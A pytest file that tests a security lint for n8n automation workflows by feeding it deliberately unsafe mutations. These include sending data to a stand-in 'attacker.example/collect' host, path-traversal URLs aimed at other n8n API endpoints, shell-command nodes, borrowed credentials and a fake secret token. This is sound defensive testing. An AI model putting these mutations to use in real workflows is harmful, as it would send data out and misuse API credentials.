"""The shipped n8n workflows pass the security lint, and the lint catches abuse."""

from __future__ import annotations

import copy
import importlib.util
import json
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[2]


def _validator() -> ModuleType:
    spec = importlib.util.spec_from_file_location(
        "validate_n8n_workflows", ROOT / "scripts" / "validate_n8n_workflows.py"
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


VALIDATOR = _validator()
WORKFLOWS = sorted((ROOT / "workflows" / "n8n").glob("*.json"))


def _load(name: str) -> dict[str, Any]:
    path = next(p for p in WORKFLOWS if p.name.startswith(name))
    document: dict[str, Any] = json.loads(path.read_text(encoding="utf-8"))
    return document


def test_five_workflows_ship_and_pass() -> None:
    assert len(WORKFLOWS) == 5
    for path in WORKFLOWS:
        assert VALIDATOR._problems(path, json.loads(path.read_text(encoding="utf-8"))) == []


def _mutated(mutate: Any) -> list[str]:
    workflow = copy.deepcopy(_load("04"))
    mutate(workflow)
    problems: list[str] = VALIDATOR._problems(Path("x.json"), workflow)
    return problems


def _http(workflow: dict[str, Any]) -> dict[str, Any]:
    node: dict[str, Any] = next(
        n for n in workflow["nodes"] if n["type"] == "n8n-nodes-base.httpRequest"
    )
    return node


@pytest.mark.parametrize(
    ("mutation", "expected"),
    [
        (
            lambda w: w["nodes"].append(
                {"name": "Run", "type": "n8n-nodes-base.executeCommand", "parameters": {}}
            ),
            "not allowed",
        ),
        (
            lambda w: w["nodes"].append(
                {"name": "JS", "type": "n8n-nodes-base.code", "parameters": {}}
            ),
            "not allowed",
        ),
        (
            lambda w: _http(w)["parameters"].update(url="https://attacker.example/collect"),
            "may only target",
        ),
        (
            lambda w: _http(w)["parameters"].update(
                sendHeaders=True, headerParameters={"parameters": [{"name": "Authorization"}]}
            ),
            "inline headers",
        ),
        (
            lambda w: _http(w)["parameters"]["options"].update(
                redirect={"redirect": {"followRedirects": True}}
            ),
            "redirects",
        ),
        (
            lambda w: w["nodes"][0]["parameters"].update(authentication="none"),
            "JWT authentication",
        ),
        (
            lambda w: w["settings"].update(saveDataSuccessExecution="all"),
            "saveDataSuccessExecution",
        ),
        (lambda w: w["settings"].pop("errorWorkflow"), "errorWorkflow"),
        (
            lambda w: _http(w)["parameters"].update(
                jsonBody="nxs_abcdefghijkl_" + "A" * 43 + "BBBBBB"
            ),
            "possible secret",
        ),
    ],
)
def test_lint_rejects_unsafe_workflows(mutation: Any, expected: str) -> None:
    problems = _mutated(mutation)
    assert any(expected in problem for problem in problems), problems


def _generator() -> ModuleType:
    spec = importlib.util.spec_from_file_location(
        "generate_n8n_workflows", ROOT / "scripts" / "generate_n8n_workflows.py"
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_committed_workflows_are_exactly_what_the_generator_produces() -> None:
    generator = _generator()
    for filename, document in generator.build().items():
        committed = (ROOT / "workflows" / "n8n" / filename).read_text(encoding="utf-8")
        assert committed == generator.render(document), f"{filename} drifted from the generator"


def _retry_node() -> dict[str, Any]:
    workflow = _load("05")
    node: dict[str, Any] = next(n for n in workflow["nodes"] if n["name"] == "Retry the execution")
    return node


RETRY_BASE = "={{ 'http://127.0.0.1:5678/api/v1/executions/' + "


@pytest.mark.parametrize(
    "url",
    [
        # traversal to another n8n API path behind a sanitised id
        RETRY_BASE + "String($json.a) + '/../workflows/' + String($('A workflow failed')"
        ".item.json.execution.id).replace(/[^A-Za-z0-9_-]/g, '').slice(0, 64) + '/retry' }}",
        # the id is not sanitised
        RETRY_BASE + "$('A workflow failed').item.json.execution.id + '/retry' }}",
        # not the retry endpoint at all
        "={{ 'http://127.0.0.1:5678/api/v1/workflows/1/deactivate?/retry' }}",
    ],
)
def test_lint_allows_only_the_exact_n8n_retry_call(url: str) -> None:
    node = copy.deepcopy(_retry_node())
    node["parameters"]["url"] = url
    assert VALIDATOR._http_problems(node, node["parameters"])


def test_n8n_api_credential_cannot_be_used_elsewhere() -> None:
    retry = _retry_node()
    assert VALIDATOR._http_problems(retry, retry["parameters"]) == []
    borrowed = copy.deepcopy(retry)
    borrowed["credentials"]["httpHeaderAuth"]["name"] = "NexusFlow token - failure recovery"
    assert VALIDATOR._http_problems(borrowed, borrowed["parameters"])
    misused = copy.deepcopy(_http(_load("04")))
    misused["credentials"] = copy.deepcopy(retry["credentials"])
    assert VALIDATOR._http_problems(misused, misused["parameters"])


def test_waits_cannot_open_a_resume_webhook() -> None:
    problems = _mutated(
        lambda w: w["nodes"].append(
            {
                "name": "Wait for webhook",
                "type": "n8n-nodes-base.wait",
                "parameters": {"resume": "webhook"},
            }
        )
    )
    assert any("time interval" in problem for problem in problems), problems
